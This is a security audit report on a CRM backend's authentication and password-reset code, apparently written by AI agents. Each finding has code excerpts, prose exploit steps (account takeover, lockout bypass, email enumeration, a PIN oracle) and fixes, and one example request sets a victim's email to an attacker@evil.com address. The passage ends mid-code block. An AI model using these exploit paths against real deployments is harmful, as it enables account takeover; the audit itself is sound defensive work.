

---

# SECURITY AUDIT — BACKEND (server side) — 2026-05-05

Multi-agent deep audit of `packages/server/src/` performed in worktree `claude/security-audit-306cff` off `main@ccb275ba` ("fix(auth): /setup-status reads BOTH wizard_completed keys").

**Methodology:** 36 specialized agents, each focused on one security aspect. Each agent ran ≥25–45 min and ≥60+ tool calls under the protocol at `.security-findings/.PROTOCOL.md`. 12 of the slots (S01–S12) had a shallow Pass 1 followed by a Pass 2 deep dive — both passes are preserved in their files.

**Slots covered:**

| Slot | Aspect |
|------|--------|
| S01 | Auth core — login/sessions/JWT/refresh/remember-me |
| S02 | Password reset, email verification, email change |
| S03 | 2FA / TOTP / step-up / recovery codes / device-trust |
| S04 | POS PIN / manager-override / sensitive POS ops |
| S05 | Master / super-admin auth + admin HTML/JS |
| S06 | JWT secrets — signing, verification, alg pinning, audience |
| S07 | CSRF — double-submit, SameSite, exempted webhooks |
| S08 | Multi-tenant isolation (tenant resolver, pool, master DB) |
| S09 | RBAC / role gates / privilege escalation |
| S10 | Tenant provisioning / repair / termination lifecycle |
| S11 | Tenant + data export, scheduled exports, backups |
| S12 | SQL injection sweep across all DB call sites |
| S13 | XSS in admin HTML, email/SMS templates, public pages |
| S14 | Path traversal in uploads / imports / backups |
| S15 | SSRF in geocode / DNS / scrapers / wallet pass / image fetch |
| S16 | XML / XXE / unsafe deserialization |
| S17 | RCE via eval / new Function / child_process / vm |
| S18 | Prototype pollution / mass assignment / body-parser quirks |
| S19 | Money endpoints — IDOR, amount tampering, race conditions |
| S20 | BlockChyp payment-terminal integration |
| S21 | Stripe + payment webhook handlers |
| S22 | Loyalty / store credit / counters / commissions arithmetic |
| S23 | PII exposure on customer / search / activity / portal |
| S24 | Logging secrets / error message leakage / request logger PII |
| S25 | Data retention / hard-delete / GDPR right-to-erasure |
| S26 | Zip-slip / tar-slip / CSV formula injection |
| S27 | Signed upload / download URLs |
| S28 | Rate-limit completeness across sensitive flows |
| S29 | CORS / Helmet / security headers / trust proxy / body limits |
| S30 | WebSocket auth / authorization / broadcast scoping |
| S31 | Cron / background jobs / scheduled services |
| S32 | Configuration encryption (secrets at rest) |
| S33 | Provider creds in DB and exposure on read endpoints |
| S34 | hCaptcha / reCAPTCHA integration |
| S35 | Public / unauth surface (booking / portal / voice / pay-link) |
| S36 | HOLISTIC — middleware order, request lifecycle, cross-module |

**Severity scale:** CRITICAL > HIGH > MEDIUM > LOW > INFO.

**How to use this appendix:**
- Each finding has `Where:` (file:line), `What:`, `Code:`, `Exploit:`, `Fix:`.
- Treat any CRITICAL or HIGH as drop-everything. MEDIUMs are next-sprint priority. LOWs and INFOs are hardening backlog.
- Backup of this appendix lives at `SECURITY_AUDIT_2026-05-05.md` in the repo root in case TODO.md is overwritten.
- Per-slot raw files live at `.claude/worktrees/security-audit-306cff/.security-findings/SXX-*.md`.
- Master branch impacted: `claude/security-audit-306cff` (read-only worktree, no source edits).

---



---

# S01-auth-core

# S01 — Auth Core Security Findings

Scope: `packages/server/src/routes/auth.routes.ts`, `packages/server/src/middleware/auth.ts`, `packages/server/src/utils/jwtSecrets.ts`
Reviewed: 2026-05-05

---

### [MEDIUM] Username login is case-sensitive — lockout bypass via case variant

- File: `packages/server/src/routes/auth.routes.ts:734`
- Description: The login query uses a plain `=` comparison on `username` against a SQLite TEXT column with no `COLLATE NOCASE` modifier and no `.toLowerCase()` normalization. The username-based rate-limit key is built from the attacker-supplied string (`username` as typed), not the canonical DB value. An attacker can therefore spray passwords against an account as `Admin`, `ADMIN`, `aDmIn`, etc. — each variant is tracked under a different rate-limit key while hitting the same account, giving up to 10 × N variants × 10 attempts = effectively unlimited pre-lockout guesses.
- Exploit: Register or know a target username `alice`. Submit 9 bad passwords as `alice`, then switch to `Alice` for 9 more, `ALICE` for 9 more, etc. No variant ever trips the 10-attempt username lockout while all guesses validate against the same bcrypt hash.
- Fix: Normalize the supplied identifier to lowercase before the DB query and before the rate-limit key construction (`username.trim().toLowerCase()`). Alternatively add `COLLATE NOCASE` to the `username` column and always key rate-limits from `user.username` (the canonical DB value), not the raw input.

---

### [MEDIUM] `checkLockoutRate` (TOTP) is not transactional — TOCTOU race allows extra attempts

- File: `packages/server/src/utils/rateLimiter.ts:106–123`
- Description: `checkLockoutRate` performs a bare `SELECT` outside any transaction, while `recordLockoutFailure` (called after the check returns `true`) is a separate statement. Two concurrent requests racing the 5th TOTP attempt will both observe `count = 4 < 5`, both pass the check, and both call `recordLockoutFailure`, each incrementing the count. The result is that two (or more) attempts can be smuggled past the lockout threshold in a window where they should both have been rejected.
- Exploit: Send five simultaneous TOTP-verify requests. Two (or more) of them arrive when count is 4; all pass `checkLockoutRate` before either increments it, giving 2+ extra guesses beyond the stated limit.
- Fix: Wrap `checkLockoutRate` in a `db.transaction` block (as `checkWindowRate` was fixed in SCAN-1065) so the SELECT and downstream INSERT/UPDATE are serialized. Alternatively merge check-and-record into a single atomic `INSERT … ON CONFLICT DO UPDATE … RETURNING count` and reject if count exceeds the cap.

---

### [MEDIUM] Device-trust cookie fingerprint uses client IP — breaks behind NAT/proxy and enables partial bypass

- File: `packages/server/src/routes/auth.routes.ts:358–362`, `841–866`
- Description: `buildDeviceFingerprint` hashes `User-Agent + req.ip`. Behind a corporate NAT or CGNAT, all employees share a single egress IP; any employee's trust cookie is fingerprint-valid for any other employee on the same NAT. Conversely a user on a mobile network whose carrier IP changes will have their trust cookie silently rejected and will be re-prompted for 2FA unexpectedly. The UA component is trivially forgeable and adds no meaningful security.
- Exploit: On a shared-IP network (office, university), obtain a valid `deviceTrust` JWT via normal 2FA login. A colluding or malicious user on the same network can replay that cookie to skip 2FA for the original account, because the IP matches and the UA is easy to copy from `User-Agent` header.
- Fix: Remove IP from the fingerprint (IP instability makes it both fragile and inadequate) and instead bind the cookie to a per-device server-generated opaque token stored in the DB alongside the userId. Verify the opaque token server-side rather than reconstructing the fingerprint at login time.

---

### [LOW] `checkLoginRateLimit` (IP) not recorded on first check — rate limit can be bypassed by 1 extra attempt

- File: `packages/server/src/routes/auth.routes.ts:707–711`, `755–760`
- Description: The IP-based login rate limiter uses separate `check` and `record` calls (SCAN-1065 pattern). The check fires before the handler body; the failure record fires only on the bad-password or user-not-found branches. A request that passes the check but never reaches a record call (e.g., crashes between the check and the bcrypt result) does not consume a slot. This is low severity because better-sqlite3 is single-process and the window between check and record is microseconds, but the design violates the atomic check-and-consume principle established elsewhere in the file.
- Exploit: Not practically exploitable in normal operation; edge case where a request aborts post-check. Noted for consistency with the project's own security model.
- Fix: Migrate IP login rate limiting to `consumeWindowRate` (already exported from rateLimiter.ts) which atomically records and checks in one transaction, then clear on success as already done at lines 1066 and 1202.

---

### [LOW] `change-password` max length is 256 chars, not the 128 cap enforced everywhere else

- File: `packages/server/src/routes/auth.routes.ts:2232–2239`
- Description: `/change-password` accepts `newPassword` up to 256 characters (line 2236), while `/setup`, `/login/set-password`, and `/reset-password` all enforce a 128-character maximum. bcrypt truncates input at 72 bytes silently, so passwords 73–256 characters long will hash but produce the same hash as their 72-byte prefix. A user who sets a 150-character password via `/change-password` will be surprised that their 80-character prefix also unlocks the account.
- Exploit: User sets a 150-char password via the change-password flow. Attacker who knows the first 72 characters (e.g., leaked from a different breach) can log in with a 72-char truncation of that password.
- Fix: Standardize the max-password-length guard to 128 characters (matching all other endpoints) at line 2236, or use a bcrypt wrapper that pre-hashes long passwords with SHA-256 before passing to bcrypt to avoid the truncation entirely.

---

### [LOW] Refresh endpoint does not rotate the old refresh-token cookie path on `bodyRefreshToken` path

- File: `packages/server/src/routes/auth.routes.ts:1209–1413`
- Description: When a mobile client supplies the refresh token in the request body (`bodyRefreshToken`), the handler issues a new `refreshToken` cookie and a new `csrf_token` cookie (lines 1370–1385). A non-browser client that used the body path never had a cookie, so these `Set-Cookie` headers are silently ignored. However, if a mobile client accidentally sends both a cookie and a body token, the cookie path is selected (`cookieRefreshToken` wins at line 1247), which could lead to the body token being discarded while the old cookie is rotated — the old refresh token in the body is still technically valid until it expires (the session is not invalidated, only a new token is issued). This is a design inconsistency rather than an immediate exploitable flaw.
- Exploit: Low impact. An attacker who steals a refresh token from the HTTP body of a mobile client can still use it until the session expires (no single-use enforcement on refresh tokens beyond the session lookup).
- Fix: Consider adding a `jti`-based refresh-token denylist or rotating the session record itself (delete-and-reinsert) so each refresh token is usable exactly once. This is the standard "refresh token rotation with family invalidation" pattern.

---

### [INFO] Refresh token rotation lacks family invalidation on reuse detection

- File: `packages/server/src/routes/auth.routes.ts:1257–1413`
- Description: The refresh endpoint verifies the token signature and checks the session DB, but does not detect or act on refresh-token reuse (i.e., presenting an old refresh token that has already been rotated). Once a new access+refresh pair is issued, the old refresh token is not explicitly invalidated — it remains valid until its `exp` claim elapses or the session row is deleted. If a refresh token is stolen, both the legitimate client and the attacker can use it to obtain fresh access tokens until one of them triggers session deletion.
- Exploit: Attacker intercepts a refresh token (e.g., network sniffing on HTTP, or XSS exfil of body token). Until the victim explicitly logs out, both parties can keep refreshing tokens indefinitely.
- Fix: Implement refresh-token family invalidation: store a one-time `refresh_jti` on the session row; on each rotation, verify the presented `jti` matches, then replace it atomically. Any mismatch (reuse detected) deletes the entire session family, forcing full re-authentication.

---

### [INFO] TOTP `verifySync` uses default ± 1 window — no explicit anti-replay for reuse within the window

- File: `packages/server/src/routes/auth.routes.ts:1017`
- Description: `verifySync({ token: code, secret })` uses otplib defaults which allow code reuse within the same 30-second window (the library does not record used tokens). An attacker who observes a TOTP code in flight (e.g., shoulder surfing, network tap) can replay it within the same 30-second window for a second login attempt.
- Exploit: Limited window (≤30 s) and the challenge token is consumed on use, reducing this to a very narrow race. Low practical risk in a CRM context.
- Fix: Cache the last accepted `(userId, code, windowIndex)` tuple in Redis or the SQLite sessions table and reject re-presentation of the same code for the same user within its validity window.

---

### [INFO] `superAdminSecret` used in TOTP key derivation — single root-key blast radius

- File: `packages/server/src/routes/auth.routes.ts:95–116`
- Description: The TOTP AES-256-GCM key (V3_KEY) is derived from `config.jwtSecret + config.superAdminSecret` via HKDF. If `JWT_SECRET` is leaked, an attacker who also knows `superAdminSecret` (which may be stored in the same `.env` file) can decrypt every stored TOTP secret, enabling 2FA bypass for all users without needing to brute-force individual accounts.
- Exploit: If the environment variables file is exfiltrated (server compromise, CI leak), both secrets are likely co-located, allowing full TOTP decryption.
- Fix: Derive the TOTP encryption key from a dedicated env var `TOTP_ENCRYPTION_KEY` that is stored in a separate secret manager entry from JWT secrets, minimizing co-location risk.

---

## PASS 2 — DEEP DIVE

### [HIGH] Unconditional challenge token issued for `password_set=0` users — account takeover without password

**Where:** `packages/server/src/routes/auth.routes.ts:788–798`

**What:**
When a user has `password_set = 0` (admin-provisioned with no password), the login handler at line 789 branches to issue a challenge token BEFORE checking whether the supplied password is correct. The constant-time bcrypt comparison at lines 744–753 always produces `passwordValid = false` for these users (their `password_hash` is NULL so `DUMMY_HASH` is used), but the `passwordValid` result is never consulted — the `password_set=0` check fires first and returns a valid challenge token to whoever requested it.

**Code:**
```typescript
// Line 744–753: bcrypt compare runs but result is ignored for password_set=0 path
const hashToCheck = user?.password_hash || DUMMY_HASH;
const bcryptResult = password ? bcrypt.compareSync(password, hashToCheck) : false;
const userExistsByte = user ? 1 : 0;
const actualBuf = Buffer.from([(bcryptResult ? 1 : 0) & userExistsByte]);
const passwordValid = crypto.timingSafeEqual(expectedBuf, actualBuf); // always false for null-hash users

// Line 788–798: passwordValid never consulted here
if (!user.password_set || !user.password_hash) {
  const challengeToken = createChallenge(user.id, tenantSlug);  // issued unconditionally
  // ...
  res.json({ success: true, data: { challengeToken, requiresPasswordSetup: true } });
  return;
}
```

**Exploit:**
An attacker who knows (or guesses) a username that belongs to a newly admin-provisioned account with `password_set=0` posts to `POST /auth/login` with any password (or none). They receive a valid challenge token with `requiresPasswordSetup: true`. They then post to `POST /auth/login/set-password` with that token and their chosen password — the UPDATE succeeds (`AND password_set = 0` matches), setting the attacker's password on the victim account. The attacker then proceeds through the 2FA enrollment flow they now control, achieving full account takeover of the uninitialized account.

**Fix:**
Add a gate before issuing the challenge on the `password_set=0` path: require a separate admin-supplied invitation credential (e.g., a one-time token emailed to the user), or remove the unauthenticated set-password flow entirely and require the admin to send a signed invitation link. At minimum, the `requiresPasswordSetup` response should NOT be distinguishable from a normal failed login without an additional credential.

---

### [MEDIUM] `PIN_NOT_SET` 403 response confirms correct PIN and bypasses rate-limit counter

**Where:** `packages/server/src/routes/auth.routes.ts:1471–1477`

**What:**
In `POST /auth/switch-user`, when a user whose PIN matches (`bcrypt.compareSync` returns true) still has `pin_set = 0` (default PIN `1234`), the handler returns HTTP 403 with `code: 'PIN_NOT_SET'` but does NOT call `recordPinFailure`. This response is distinguishable from the wrong-PIN 401 response, leaking two facts: (1) the PIN was correct, and (2) the account is using the default PIN. Furthermore, since no failure is recorded, repeated submissions of PIN `1234` burn no rate-limit slots, allowing unlimited enumeration.

**Code:**
```typescript
const user = usersWithPins.find(u => bcrypt.compareSync(pin, u.pin)); // PIN matched

if (user && user.pin_set === 0) {
  // No recordPinFailure() call here — rate limit not charged
  res.status(403).json({
    success: false,
    message: 'Default PIN must be changed before first use...',
    code: 'PIN_NOT_SET',   // Oracle: PIN was correct
  });
  return;
}
```

**Exploit:**
An authenticated attacker (any valid session) submits `pin=1234` repeatedly to `/auth/switch-user`. A 403 + `code:'PIN_NOT_SET'` response confirms that at least one active user still has the default PIN `1234` AND consumes no rate-limit slot, so this probe can run indefinitely. The attacker then knows to target that user for other attacks.

**Fix:**
Call `recordPinFailure(db, ip)` on the `PIN_NOT_SET` branch so the attempt counts toward the IP-based lockout. Additionally, return a generic 403 without the `code` field, or return the same 401 as an invalid-PIN response, to eliminate the distinguishing oracle.

---

### [MEDIUM] `recover-with-backup-code` lacks constant-time dummy compare — timing oracle for email enumeration

**Where:** `packages/server/src/routes/auth.routes.ts:2084–2096`

**What:**
The `POST /recover-with-backup-code` endpoint performs a user lookup by email, then immediately calls `fail()` if no user is found. The "user not found" path completes in roughly one DB query round-trip (~1–5 ms), whereas the "user found" path runs up to 8 bcrypt comparisons against backup code hashes (~800–1200 ms total). The `/forgot-password` endpoint correctly applies a dummy `bcrypt.compareSync` on the not-found path (lines 1708–1712) to equalize timing, but `/recover-with-backup-code` has no such protection. There is also no `enforceMinDuration` call on this endpoint.

**Code:**
```typescript
const user = await adb.get<any>(
  'SELECT ... FROM users WHERE email = ? AND is_active = 1', normalizedEmail
);
const fail = () => {
  recordLoginFailure(db, ip);
  res.status(401).json({ ... }); // returns immediately — no dummy bcrypt
};
if (!user || !user.backup_codes) { fail(); return; }
// user found path: runs bcrypt.compareSync up to 8 times (~1 second)
```

**Exploit:**
An attacker submits `POST /recover-with-backup-code` with a target email address and any backup code. A fast response (~5 ms) reveals the email does not exist; a slow response (~1 second) reveals it does, exists, and has backup codes. This enumeration works at a 5-requests-per-15-min IP rate limit, giving approximately 5 probes per window.

**Fix:**
On the not-found path, run a dummy `bcrypt.compareSync(backupCode, DUMMY_HASH)` (or at least one iteration) before returning — mirroring the pattern at line 1712 in `/forgot-password`. Additionally, add `enforceMinDuration` anchored at the handler start (as done on `/login` and `/forgot-password`).

---

### [MEDIUM] `currentPassword` has no maximum length cap on `/account/2fa/disable`, `/change-password`, `/change-pin` — unbounded bcrypt input

**Where:** `packages/server/src/routes/auth.routes.ts:1909`, `2228`, `2348`

**What:**
Three authenticated endpoints accept `currentPassword` with only a presence check (`typeof currentPassword !== 'string'`) but no maximum length validation before passing it to `bcrypt.compareSync`. While bcrypt itself truncates input at 72 bytes, the JSON body is buffered up to the global 1 MB Express limit, and all memory for the string is allocated before the compare. A stolen access token holder can submit multi-megabyte `currentPassword` values to these endpoints to burn CPU on bcrypt preprocessing and Node.js string operations, causing per-request latency spikes. The auth routes skip the global API rate limiter (index.ts line 1183), so these endpoints have only their own per-user/IP rate limits as protection.

**Code:**
```typescript
// /account/2fa/disable line 1909 — no max length:
if (!currentPassword || typeof currentPassword !== 'string') {
  res.status(400).json({ ... }); return;
}
// then immediately: bcrypt.compareSync(currentPassword, user.password_hash)
```

**Fix:**
Add `currentPassword.length > 128` rejection (matching the new-password cap) on all three endpoints before the bcrypt call. Since bcrypt silently truncates at 72 bytes, any input beyond 128 characters is either an attack or a client bug — reject it early with HTTP 400.

---

### [LOW] `backup_code_recovery_failed` audit log records plaintext email — violates SEC-L43

**Where:** `packages/server/src/routes/auth.routes.ts:2092`

**What:**
On a failed backup-code recovery attempt, the audit log call records `{ email: normalizedEmail }` — the full plaintext email address supplied by the requester. This directly contradicts the project's own SEC-L43 policy ("Do not persist attacker-supplied username on unknown-user path") applied consistently elsewhere: `/login` records `'<unknown-user>'`, and `/forgot-password` hashes the email before logging (lines 1707, 1731). Anyone with read access to the `audit_logs` table can harvest email addresses from failed recovery probes.

**Code:**
```typescript
const fail = () => {
  recordLoginFailure(db, ip);
  audit(db, 'backup_code_recovery_failed', user?.id ?? null, ip, { email: normalizedEmail });
  //                                                                  ^^^^ full plaintext email
  ...
};
```

**Exploit:**
An operator or admin with audit-log read access sees every email that was probed via the recovery endpoint, including attacker-controlled probe emails. PII exposure in audit trail.

**Fix:**
For the `user === null` branch, log `{ email: '<unknown>' }` or `{ email_hash: sha256(email).slice(0, 16) }` consistent with the `/forgot-password` precedent. For the `user !== null` branch, log `user.id` only (already captured as the second argument) rather than the email field.

---

### [LOW] HKDF IKM for TOTP V3 key uses concatenated parts without length prefix — theoretical domain-confusion

**Where:** `packages/server/src/routes/auth.routes.ts:107`, `112–117`

**What:**
`hkdfKey` joins the `ikmParts` array with `ikmParts.join('')` (no separator or length prefix). For the V3 TOTP key, `ikmParts = [config.jwtSecret, config.superAdminSecret]`. Two distinct `(jwtSecret, superAdminSecret)` pairs that differ only by a boundary shift (e.g., `('abc', 'def')` vs `('ab', 'cdef')`) produce identical IKM and thus an identical derived key. In practice this is not exploitable since both secrets are long random hex strings, but it violates the HKDF IKM domain-separation principle and could cause unexpected behavior if either secret is intentionally constructed or very short.

**Code:**
```typescript
const ikm = Buffer.from(ikmParts.join(''));  // 'abc'+'def' == 'ab'+'cdef'
const derived = crypto.hkdfSync('sha256', ikm, Buffer.from(salt), Buffer.from(info), length);
```

**Fix:**
Replace `ikmParts.join('')` with a length-prefixed encoding, e.g., `ikmParts.map(s => `${s.length}:${s}`).join('|')`, or concatenate with a fixed separator that cannot appear in the secret values (e.g., a null byte if secrets are hex strings). Alternatively, run each part through the HKDF extract phase separately.

---

### [INFO] Challenge tokens store `tenantSlug` but `validateChallenge`/`consumeChallenge` never enforce it

**Where:** `packages/server/src/routes/auth.routes.ts:171`, `190–213`, `931`, `985–986`

**What:**
`createChallenge` stores `tenantSlug` in the challenge map entry (line 186), with the comment "include tenantSlug to prevent cross-tenant 2FA reuse" (line 170). However, neither `validateChallenge` nor `consumeChallenge` reads or checks the stored `tenantSlug` against the current request. This means a challenge token issued on tenant-A can be presented to tenant-B's `/login/set-password`, `/login/2fa-setup`, or `/login/2fa-verify`. In practice this is mostly harmless because the downstream DB queries run against the request-scoped `req.asyncDb` (tenant-B's database), where the userId from tenant-A won't exist, causing the operation to fail. But the intent documented in the code is not implemented.

**Code:**
```typescript
function validateChallenge(token: string): number | null {
  const entry = challenges.get(token);
  if (!entry || entry.expires < Date.now()) { challenges.delete(token); return null; }
  return entry.userId;  // tenantSlug in entry is never checked
}
```

**Exploit:**
No known practical exploit given database isolation, but a cross-tenant edge case exists: if two tenants share a user ID (which shouldn't happen under multi-tenant isolation but could occur in misconfigured single-tenant clones), a challenge from tenant-A could authorize an operation on tenant-B.

**Fix:**
Add a `requestedTenantSlug` parameter to `validateChallenge` and reject entries where `entry.tenantSlug !== requestedTenantSlug`. This is a one-line change that actually implements the documented security intent.


---

# S02-password-reset

# S02 — Password Reset / Email Verification / Email Change

## Findings

---

### [MEDIUM] GET endpoint provisions tenant (state-changing GET)

- File: `packages/server/src/routes/signup.routes.ts:749`
- Description: `GET /signup/verify/:token` performs full tenant provisioning (database creation, DNS record, user insert) and issues JWT cookies. State-changing operations should only be on POST/PUT/DELETE; a GET can be triggered silently by prefetch bots, email-client link scanners, and `<img src>` loads, consuming the single-use token before the user clicks.
- Exploit: An email-security scanner (e.g. Google Safe Browsing, Proofpoint) issues a HEAD/GET against URLs found in the inbox. The verification link is fetched, the token is consumed, and `provisionTenant()` runs — the user clicks the real link and gets "invalid or expired" with no shop created.
- Fix: Move provisioning to a POST handler. The GET should render a confirmation page with a form; the form submit triggers the POST that actually calls `provisionTenant()`.

---

### [MEDIUM] Admin email change requires no re-auth, sends no notification to old address

- File: `packages/server/src/routes/settings.routes.ts:1672,1763-1771`
- Description: The `sensitiveChange` guard (`!!password || !!pin || isRoleChange`) does not include an email change. An admin can update any user's email address without providing their own password (no re-auth), and the old email address receives no notification of the change. Email is the account-recovery anchor for password reset, so changing it silently hands full account takeover to anyone who later controls that email.
- Exploit: An attacker who steals a valid admin access token (e.g. via XSS) calls `PUT /settings/users/:id` with `{ email: "attacker@evil.com" }`. No re-auth is required, the victim's email is changed silently, and the attacker triggers `/forgot-password` to issue a reset link to their inbox.
- Fix: Add `email` to the `sensitiveChange` check so it requires `admin_confirm_password` (and TOTP if enabled). After the email update, send a security notification to the *old* address informing the user their email was changed and by whom.

---

### [LOW] Reset token in URL path — exposure via Referer header and server logs

- File: `packages/server/src/routes/auth.routes.ts:1743,1759`
- Description: The password reset URL is `https://<host>/reset-password/<64-hex-token>`. Tokens in the URL path are sent in the HTTP `Referer` header when the page loads third-party resources (analytics, fonts, CDN scripts) and may be retained in reverse-proxy access logs, browser history, and sharing tools. Fragment (`#token`) or POST-body delivery would avoid this.
- Exploit: A third-party script included on the `/reset-password` page (e.g. analytics) receives the full URL including token in `Referer`. The third-party can use the token within its 1-hour validity window to take over the account.
- Fix: Either deliver the token in the URL fragment (`#token`), strip `Referer` on the reset page (`<meta name="referrer" content="no-referrer">`), or use a short-lived opaque identifier that resolves server-side (POST body delivery). At minimum add `Referrer-Policy: no-referrer` to responses that render the reset page.

---

### [LOW] Signup verification token logged as plaintext prefix

- File: `packages/server/src/routes/signup.routes.ts:715`
- Description: `logger.info('pending signup created', { ..., tokenPrefix: verifyToken.slice(0, 8) })` writes the first 8 hex characters (32 bits) of a 256-bit token to application logs. This is documented as an operator recovery aid (SCAN-743). However, if logs are aggregated to a SIEM or shipping pipeline that is itself compromised, an attacker learns a partial prefix. For a 32-byte token the remaining 248 bits are computationally infeasible to brute-force, but the comment explicitly invites operators to "recover" the token from logs, meaning full tokens may end up logged informally during incident response.
- Exploit: Low practical impact given 248 bits of search space, but the comment pattern may lead future developers to log the full token. The audit note ("operators can recover if SMTP delivered but the process restarted") should use a different mechanism.
- Fix: Remove the `tokenPrefix` from the log line. Instead log a non-sensitive lookup key (e.g. `sha256(token).slice(0,16)`) if operator recovery is needed, and document the recovery path as "user re-submits the signup form" rather than token recovery.

---

### [INFO] No notification to user when password reset is requested on their account

- File: `packages/server/src/routes/auth.routes.ts:1753-1772`
- Description: When `/forgot-password` is called for a real user, the reset email is sent but no secondary "someone requested a password reset for your account" alert is sent to the same address (or to any admin channel). This is an industry best-practice gap rather than a direct exploit path.
- Exploit: An attacker initiating a social-engineering reset would benefit from the victim having no advance notice that a reset was triggered.
- Fix: The reset email already serves as the notification, which is acceptable. Consider adding a brief "if you didn't request this, your password has not been changed — you can ignore this email" footer (already present), and optionally adding a master-audit log entry with the tenant admin dashboard surfacing recent reset requests.

---

### [INFO] Password reset flow does not bypass or enforce 2FA

- File: `packages/server/src/routes/auth.routes.ts:1784-1891`
- Description: `/reset-password` sets a new password and deletes all sessions, but does not disable TOTP. After reset, the user must still complete the normal 2FA challenge on next login — this is correct behavior. No bypass exists. Noted for completeness.
- Exploit: N/A — behavior is secure.
- Fix: No action required.

---

## PASS 2 — DEEP DIVE

### [HIGH] Email verification hardcoded disabled in production — no email ownership proof

**Where:** `packages/server/src/routes/signup.routes.ts:618`

**What:**
`const skipEmailVerification = true;` is a hardcoded constant (not an env flag) that permanently disables email verification for ALL signup requests, including in production (`multiTenant` mode). Any party can create a tenant under any email address they do not own. The "restore before opening signup to the public internet" comment has not been acted upon.

**Code:**
```typescript
// TEMP-NO-EMAIL-VERIF (2026-04-24): email verification fully disabled
// because outbound SMTP is not yet configured / send-failed reports from
// production. Restore the SEC-H94 / BH-0002 gate by flipping the constant
// back to the env-flag expression once SMTP is healthy:
//   const skipEmailVerification = process.env.SKIP_EMAIL_VERIFICATION === '1' && config.nodeEnv !== 'production';
// While this is `true`, /signup provisions tenants synchronously without
// proving control of the email — re-enable before opening signup to the
// public internet.
const skipEmailVerification = true;
```

**Exploit:**
An attacker registers a tenant using `victim@company.com` as the admin email. They immediately receive admin credentials (line 639: `issueSignupTokens`) without the victim ever seeing or approving the signup. The victim's email is then associated with a tenant the attacker controls; password reset links for that email will go to the attacker's shop, not the victim's. If the same victim email exists in another tenant, the attacker can leverage the shared email to interfere with account recovery.

**Fix:**
Replace the hardcoded `true` with the env-flag expression and ensure SMTP is configured before public SaaS launch. Block signup with a clear 503 if email is required but SMTP is not configured (use the existing `config.hCaptchaEnabled`-style boot guard pattern).

---

### [MEDIUM] Plaintext admin password stored in process memory for up to 1 hour

**Where:** `packages/server/src/routes/signup.routes.ts:105-113`, `:665`

**What:**
When email verification is active, `pendingSignups` is an in-memory `Map<string, {...; adminPassword: string; ...}>` that stores the plaintext admin password for the full 1-hour verification TTL. The password is not hashed until `provisionTenant()` is called at verification time (line 346 of `tenant-provisioning.ts`). Any mechanism that can read Node.js process memory — heap snapshots, `--inspect` debugger dumps, OS core dumps, or a future memory-disclosure bug — exposes plaintext passwords.

**Code:**
```typescript
const pendingSignups = new Map<string, {
  slug: string;
  shopName: string;
  adminEmail: string;
  adminPassword: string;   // ← plaintext, lives up to 1 hour
  ...
  createdAt: number;
  ipAddress: string;
}>();
// ...
pendingSignups.set(verifyToken, {
  ...
  adminPassword: admin_password,  // ← stored verbatim from req.body
```

**Exploit:**
An operator with heap-snapshot access (e.g., via `--inspect` in a staging environment, or a crash dump collected by an observability agent) sees plaintext passwords for every in-progress signup. Since users frequently reuse passwords across services, this constitutes credential exposure beyond the CRM.

**Fix:**
Hash `admin_password` with bcrypt before inserting into `pendingSignups`, and pass the hash directly to `provisionTenant()`. Update `provisionTenant` to accept an already-hashed `adminPasswordHash` parameter alongside `adminPassword` so the hash path is explicit.

---

### [MEDIUM] Per-tenant rate limit on `forgot-password` allows cross-tenant email bombing

**Where:** `packages/server/src/routes/auth.routes.ts:1648,1651`; `packages/server/src/middleware/tenantResolver.ts:511`

**What:**
`/forgot-password` rate-limits to 3 attempts per hour per IP, but the rate limit is stored in the **tenant-specific database** (`req.db`, which `tenantResolver` sets to the tenant DB for subdomain requests). An attacker can multiply this limit by targeting the same victim email across N different tenant subdomains: each tenant's rate_limits table is independent, so 3 × N reset emails can be sent per hour from a single IP.

**Code:**
```typescript
// In auth.routes.ts — req.db is tenant-scoped
const db = req.db;
if (!checkWindowRate(db, 'forgot_password', ip, 3, 3600_000)) {
  res.status(429).json({ ... });
  return;
}
// In tenantResolver.ts — sets req.db per subdomain
req.db = await getTenantDb(tenant.slug);
```

**Exploit:**
Attacker knows victim has accounts at `shop1.bizarrecrm.com` and `shop2.bizarrecrm.com`. From a single IP, they POST to both `/api/v1/auth/forgot-password` endpoints, each with the victim's email. Each tenant allows 3 attempts/hour → victim receives 6 reset emails/hour from one IP. Scaling across many tenants or many IPs produces unbounded email bombardment against the victim.

**Fix:**
Add a secondary per-target-email rate limit stored in the **master DB** (not the tenant DB) so it is enforced across all tenants regardless of the subdomain. Additionally, cap how many reset emails any single email address can receive per hour across all tenants.

---

### [MEDIUM] `reset_token` and `pin` columns not redacted in tenant/GDPR exports — wrong field names in blacklist

**Where:** `packages/server/src/services/tenantExport.ts:90`; `packages/server/src/services/dataExportGenerator.ts:79`

**What:**
Both export services list `reset_token_hash` and `pin_hash` in their `SENSITIVE_FIELDS` blacklists, but neither column exists. The actual column names (from migrations 065 and 001) are `reset_token` and `pin`. As a result, both columns are exported unredacted: `reset_token` contains the SHA-256 hash of the active reset token plus its expiry; `pin` contains the bcrypt-hashed user PIN. Whoever receives the export sees which users have active reset tokens (and their expiry), and has bcrypt hashes of PINs.

**Code:**
```typescript
// tenantExport.ts:90 — wrong column names:
['users', new Set(['password_hash', 'totp_secret', 'pin_hash', 'recovery_codes',
                   'reset_token_hash', 'remember_token_hash'])],
// Actual schema (migrations/065_password_reset_tokens.sql):
// ALTER TABLE users ADD COLUMN reset_token TEXT;
// Actual schema (migrations/001_initial.sql):
//   pin TEXT,
```

**Exploit:**
An admin legitimately requests a GDPR data export. The export ZIP includes `tables/users.ndjson` with `reset_token` set to the SHA-256 hash of any outstanding reset token and `pin` set to the bcrypt hash. If the export ZIP is shared or leaked, an attacker learns which accounts have active reset tokens (aiding targeted social engineering) and has bcrypt hashes of PINs to attempt offline cracking (PINs are typically 4–6 digits — trivially crackable offline).

**Fix:**
Add `reset_token`, `reset_token_expires`, and `pin` (the actual column names) to the sensitive field sets in both `tenantExport.ts` and `dataExportGenerator.ts`. Remove the non-existent `reset_token_hash` and `pin_hash` entries.

---

### [MEDIUM] `change-password` accepts passwords up to 256 chars; `reset-password` caps at 128 — state inconsistency

**Where:** `packages/server/src/routes/auth.routes.ts:1790` (reset-password); `:2236` (change-password)

**What:**
`POST /reset-password` rejects `password.length > 128` while `POST /change-password` rejects `password.length > 256`. A user who sets a 129–256 character password via `change-password` can no longer reset their password via the forgot-password flow — the reset form enforces the lower cap, so any new password they try to set (including reusing the old one) would fail if it exceeds 128 chars. This can result in a user being permanently locked out of password recovery.

**Code:**
```typescript
